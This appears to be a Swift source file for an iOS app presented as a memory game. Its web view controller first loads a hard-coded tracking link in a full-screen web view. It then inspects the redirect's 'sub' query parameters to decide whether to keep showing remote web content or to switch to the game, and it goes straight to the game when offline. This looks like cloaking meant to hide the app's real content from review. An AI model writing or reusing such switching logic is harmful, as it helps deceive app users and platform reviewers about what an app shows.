//
//  WebViewController.swift
//  MemoryTestGame
//
//  Created by Andrii Pyvovarov on 11/24/19.
//  Copyright © 2019 Andrii Pyvovarov. All rights reserved.
//

import Foundation
import UIKit
import WebKit

class WebViewController: UIViewController, UIScrollViewDelegate, WKNavigationDelegate, WKUIDelegate {
    
    //MARK: - IBOutlets
    @IBOutlet weak var mainWebView: WKWebView!
    @IBOutlet weak var loadingIndicator: UIActivityIndicatorView!
    
    //MARK: - Local params
    let urlString = "https://appstrack18.xyz/CX67h1bP"
    private var firstUrlLoaded: Bool = false
    private var lastRequest : URLRequest?
    private let url1 = URL(string: "https://appstrack18.xyz/CX67h1bP")
    private var url2 = URL(string: "https://appstrack18.xyz/CX67h1bP")
    
    //MARK: - Lyfecycle
    override func viewDidLoad() {
        super.viewDidLoad()
        
        mainWebView.scrollView.delegate = self
        mainWebView.navigationDelegate = self
        self.mainWebView.uiDelegate = self
        
        loadWebViewWithDelay()
    }
    
    //MARK:- Private functions
    private func loadGame(){
        weak var levelVC = (VSBuilder.createLevelVC() as! LevelViewController)
        self.present(levelVC!, animated: true, completion: nil)
    }
    
    private func loadWebViewWithDelay(){
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
            if let url = URL(string: self.urlString.self) {
                let request = URLRequest(url: url)
                self.mainWebView.load(request)
                self.lastRequest = request
            }
        }
    }
    
    //MARK:- Service functions
    func scrollViewDidScroll(_ scrollView: UIScrollView) {
        if scrollView.contentOffset.y > scrollView.contentSize.height - scrollView.bounds.height {
            scrollView.contentOffset.y = scrollView.contentSize.height - scrollView.bounds.height
        }
    }
}
extension WebViewController{
    
    //MARK:- Standart web view functions
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
           if navigationAction.targetFrame == nil {
               webView.load(navigationAction.request)
           }
           return nil
       }
    func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        if !firstUrlLoaded {
            loadingIndicator.startAnimating()
        }
        mainWebView.isHidden = false
        
        
    }
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        firstUrlLoaded = true
        if url1 == url2 {
            UserDefaults.standard.set(1, forKey: "firstEntry")
            UserDefaults.standard.set(2, forKey: "view")
            loadGame()
        }
        loadingIndicator.stopAnimating()
    }
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        var counter : Int = 0
        if let url = navigationAction.request.url?.absoluteURL{
            lastRequest = navigationAction.request
            if url.valueOf("sub2") != nil {
                if checkUrlPath(url: url) == false  {
                   UserDefaults.standard.set(1, forKey: "firstEntry")
                   UserDefaults.standard.set(1, forKey: "view")
                } else {
                    loadGame()
                    UserDefaults.standard.set(1, forKey: "firstEntry")
                    UserDefaults.standard.set(2, forKey: "view")
                }
            }
            url2 = url
        }
        guard let urlString = navigationAction.request.url?.absoluteURL else {return}
        if counter > 0 && urlString.valueOf("sub2") == nil {
            UserDefaults.standard.set(1, forKey: "firstEntry")
            UserDefaults.standard.set(2, forKey: "view")
            loadGame()
        } else {counter += 1}      
        decisionHandler(.allow)
    }
    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        if !(error._domain == NSURLErrorDomain && error._code == NSURLErrorNotConnectedToInternet) {
            return
        }
        loadGame()
        
        firstUrlLoaded = false
    }
    
    //MARK: - Method, that check URL query path
    private func checkUrlPath(url: URL) -> Bool{
        if url.pathComponents.isEmpty{
            return true
        }
        if url.valueOf("sub1") != Optional("") && url.valueOf("sub1") != nil{
            if checkLinkHelper.sub1(myParam: url.valueOf("sub1")!).checkParam == true {
                return true
            }
        }
        if url.valueOf("sub3") != Optional("") && url.valueOf("sub3") != nil{
            if checkLinkHelper.sub3(myParam: url.valueOf("sub3")!).checkParam == true {
                return true
            }
        }
        if url.valueOf("sub4") != Optional("") && url.valueOf("sub4") != nil{
            if checkLinkHelper.sub4(myParam: url.valueOf("sub4")!).checkParam == true {
                return true
            }
        }
        if url.valueOf("sub5") != Optional("") && url.valueOf("sub5") != nil{
            if checkLinkHelper.sub5(myParam: url.valueOf("sub5")!).checkParam == true {
                return true
            }
        }
        if url.valueOf("sub6") != Optional("") && url.valueOf("sub6") != nil{
            if checkLinkHelper.sub6(myParam: url.valueOf("sub6")!).checkParam == true {
                return true
            }
        }
        if url.valueOf("sub7") != Optional("") && url.valueOf("sub7") != nil{
            if checkLinkHelper.sub7(myParam: url.valueOf("sub7")!).checkParam == true {
                return true
            }
        }
        if url.valueOf("sub9") != Optional("") && url.valueOf("sub9") != nil{
            if checkLinkHelper.sub9(myParam: url.valueOf("sub9")!).checkParam == true {
                return true
            }
        }
        return false
    }
}
